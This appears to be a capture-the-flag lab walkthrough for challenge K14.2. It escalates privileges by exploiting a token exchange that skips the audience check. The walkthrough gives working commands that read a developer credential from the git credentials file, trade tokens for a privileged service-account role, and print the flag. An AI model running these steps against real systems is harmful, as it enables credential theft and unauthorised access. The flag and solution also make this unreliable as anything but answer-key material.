# K14.2 Walkthrough: Claim the export role

Precondition: the K13.4 workload token (`$WORKLOAD`).

Vulnerability: the role exchange checks the K3s token issuer and subject, but it
does NOT check the audience. The workload token has the default K3s audiences,
not `fieldkest-export-access`. The matching subject still grants the export role.

## Step 0: open a participant shell

```
gcloud compute ssh <range-vm> --project prod-mgau4w --zone us-central1-a --tunnel-through-iap
sudo docker exec -it --user rowan cinder-keplerops-k-dev bash
```

## Step 1: get the workload token

```
CA=~/.local/share/keplerops/ca.crt
DEV=$(sed -E 's#https://([^@]+)@.*#\1#' ~/.config/git/credentials)
WORKLOAD=$(curl -sS --cacert $CA -u "$DEV" \
  -H 'Content-Type: application/json' -d '{}' \
  https://cloud-api.keplerops.test/api/workspaces/current/token-exchange \
  | grep -o '"access_token":"[^"]*"' | cut -d'"' -f4)
```

## Step 2: exchange the workload token for the export role token (K14.2 acceptance check)

Use the workload token (not the fixture token). Capture the role token for the
next challenges.

```
ROLE=$(curl -sS --cacert $CA -H "Authorization: Bearer $WORKLOAD" \
  -H 'Content-Type: application/json' -d '{}' \
  https://cloud-api.keplerops.test/api/token-exchange/support-export-editor \
  | tee /dev/stderr | grep -o '"access_token":"[^"]*"' | cut -d'"' -f4)
echo "ROLE=$ROLE"
```

Output (on stderr from `tee`):

```json
{"accepted_input_audience":"fieldkest-build-records","access_token":"eyJ<...>","audience":"support-export-editor","expires_in":3600,"flag":"FLAG{f1aee508e418ac7c}","principal":"svc-fieldlink-export","role":"role/support-export-editor","schema":"fieldkest.role-session/v1"}
```

`$ROLE` is a real K3s service-account token for svc-fieldlink-export (a JWT,
starts with `eyJ`). K14.3, K15.x, K16.x and K31.x use it. K15 passes it to the
K3s API; the other cards confirm the identity.
